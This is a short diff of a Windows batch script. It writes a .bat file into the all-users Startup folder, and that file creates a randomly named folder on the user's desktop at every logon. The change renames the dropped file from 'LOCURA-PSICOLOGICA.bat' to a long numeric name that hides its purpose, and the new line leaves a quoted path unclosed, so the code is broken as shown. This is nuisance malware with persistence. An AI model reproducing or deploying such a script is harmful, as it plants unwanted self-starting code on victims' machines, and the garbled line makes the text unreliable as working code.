@@ -37,7 +37,8 @@ if not exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\Im-nev
         echo setlocal
         echo cd "%SystemDrive%\Users\%USERNAME%\Desktop\"
         echo mkdir %RANDOM%%RANDOM%%RANDOM%%RANDOM%
-    ) > "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\LOCURA-PSICOLOGICA.bat"
+    ) > "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\934588528141487430192762573493023928634028176.bat
+
 
 
 
